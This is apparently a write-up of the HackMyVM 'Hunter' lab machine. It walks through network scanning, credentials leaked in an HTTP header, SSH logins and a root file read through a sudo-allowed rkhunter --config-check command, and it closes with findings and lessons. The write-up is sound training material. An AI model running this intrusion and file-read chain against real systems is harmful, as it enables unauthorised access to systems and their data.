# Hunter — HackMyVM Write-Up

## Machine Info

| Field | Details |
|---|---|
| **Machine** | Hunter |
| **Platform** | HackMyVM |
| **Difficulty** | Beginner |
| **OS** | Linux (Alpine) |
| **Author** | sml |

**Summary:** Hunter is a beginner-level Boot2Root machine. Initial access is gained by discovering credentials leaked in an HTTP response header via a POST request to a hidden `/admin` endpoint on a Golang web server. Lateral movement is performed by finding credentials for a second user stored in a web directory. Privilege escalation to root is achieved by abusing `rkhunter`'s `--config-check` feature to perform an arbitrary file read on the root flag.

---

## Recon

### Host Discovery

Started by identifying the target on the local network using `netdiscover`:

```bash
sudo netdiscover -r 172.20.10.0/24
```

```
IP            MAC Address        Hostname
172.20.10.1   2e:c2:53:59:66:64  Unknown
172.20.10.2   60:ff:9e:e3:71:c4  AzureWave Technology Inc.
172.20.10.3   08:00:27:14:22:ad  PCS Systemtechnik GmbH
```

Target identified: `172.20.10.3`

### Port Scanning

```bash
nmap -sV -sC -p- 172.20.10.3
```

| Flag | Meaning |
|---|---|
| `-sV` | Version detection — identifies the service and version on each open port |
| `-sC` | Runs default NSE scripts — grabs banners, finds robots.txt, checks for common misconfigs |
| `-p-` | Scans all 65535 ports, not just the default top 1000 |

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Golang net/http server
```

Two open ports — SSH on 22 and a Golang HTTP server on 8080. Nmap also picked up a `robots.txt` with a disallowed `/admin` entry, which is worth investigating.

---

## Enumeration

### Web Enumeration

Ran `gobuster` against port 8080 to map the application surface. The server returns HTTP 200 for non-existent paths (wildcard response), so had to filter by response length:

```bash
gobuster dir -u http://172.20.10.3:8080 \
  -w /home/shalopai/Desktop/directory-list-2.3-medium.txt \
  --exclude-length 21
```

| Flag | Meaning |
|---|---|
| `dir` | Directory/file bruteforce mode |
| `-u` | Target URL |
| `-w` | Wordlist to use for bruteforcing |
| `--exclude-length 21` | Ignore responses with body length of 21 bytes (wildcard false positives) |

```
/admin    (Status: 200) [Size: 13]
/beacon   (Status: 204) [Size: 0]
```

Checked the `/admin` endpoint with a GET request:

```bash
curl -v -X GET http://172.20.10.3:8080/admin
```

| Flag | Meaning |
|---|---|
| `-v` | Verbose — shows full request and response headers, not just the body |
| `-X GET` | Explicitly sets the HTTP method (GET is default, but useful for clarity) |

```
< HTTP/1.1 200 OK
Invalid JWT.
```

The endpoint exists but requires a JWT token. No session token was available, so tried a different HTTP method.

---

## Initial Access

### HTTP Response Header Leak

Sent a POST request to `/admin`:

```bash
curl -v -X POST http://172.20.10.3:8080/admin
```

| Flag | Meaning |
|---|---|
| `-v` | Verbose — shows full request and response headers |
| `-X POST` | Changes the HTTP method to POST instead of the default GET |

```
< HTTP/1.1 200 OK
< X-Secret-Creds: hunterman:thisisnitriilcisi
```

Credentials leaked directly in a custom response header `X-Secret-Creds`. The body still returned `Invalid JWT.` — easy to miss if only looking at the response body.

**Credentials obtained:** `hunterman:thisisnitriilcisi`

### SSH Login

```bash
ssh hunterman@172.20.10.3
```

Logged in successfully. Retrieved the user flag:

```bash
hunter:~$ cat user.txt
HMV{VcvaIKcezQVcvaIKcezQ}
```

---

## Lateral Movement

### User Enumeration

Checked `/etc/passwd` and found a second user:

```
hunterman:x:1000:1000::/home/hunterman:/bin/sh
huntergirl:x:1001:1001::/home/huntergirl:/bin/sh
```

`hunterman` had no sudo rights, so looked for credentials for `huntergirl` elsewhere on the system.

### Credential Discovery

Browsed the web server files in `/var/www/html`:

```bash
hunter:/var/www/html$ cat robots.txt
h u n t e r g i r l:fickshitmichini
```

Credentials for `huntergirl` were stored in plaintext in the web server's `robots.txt` — hidden in plain sight with spaces between characters.

### SSH Lateral Movement

```bash
ssh huntergirl@localhost
```

Logged in as `huntergirl`. Checked sudo rights:

```bash
hunter:~$ sudo -l
User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
```

`huntergirl` can run `rkhunter` as root without a password.

---

## Privilege Escalation

### rkhunter Arbitrary File Read

`rkhunter` is a rootkit detection tool. Its `--config-check` (`-C`) flag validates a configuration file — and critically, it will attempt to parse **any file** passed via `--configfile`, printing the contents as error output when the format doesn't match.

This means it can be abused to read arbitrary files as root:

```bash
sudo rkhunter -C --configfile /root/root.txt
```

| Flag | Meaning |
|---|---|
| `sudo` | Run as root (allowed via NOPASSWD sudoers rule) |
| `-C` / `--config-check` | Validates a configuration file — prints contents as errors if format is wrong |
| `--configfile` | Specifies which file to use as config — here we point it at root's flag file |

```
grep: bad regex ' HMV{FhOpuXDUlZFhOpuXDUlZ} ': Invalid contents of {}
Unknown configuration file option: HMV{FhOpuXDUlZFhOpuXDUlZ}
```

The root flag was printed in the error output.

**Root flag:** `HMV{FhOpuXDUlZFhOpuXDUlZ}`

---

## Findings Summary

| # | Finding | Severity |
|---|---|---|
| 1 | Credentials leaked in HTTP response header | 🔴 Critical |
| 2 | Plaintext credentials stored in web-accessible file | 🔴 Critical |
| 3 | rkhunter NOPASSWD sudo → arbitrary file read | 🔴 Critical |
| 4 | Golang server returns wildcard 200 responses | 🟡 Medium |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | Network Service Discovery | T1046 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | Exploit Public-Facing Application (header leak) | T1190 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Collection | Arbitrary File Read via misconfigured binary | T1005 |

---

## Lessons Learned

- Always test HTTP endpoints with **multiple methods** (GET, POST, OPTIONS) — behaviour and response headers can differ significantly. The credential leak was only visible on POST.
- Credentials hidden in unusual formats (spaces between characters) are still plaintext — always check all files in web-accessible directories.
- Before escalating, always check `sudo -l` — NOPASSWD entries on third-party binaries are a common privesc path. Cross-referencing allowed binaries against [GTFOBins](https://gtfobins.github.io/) is essential.

---

*Completed on HackMyVM in a controlled lab environment.*
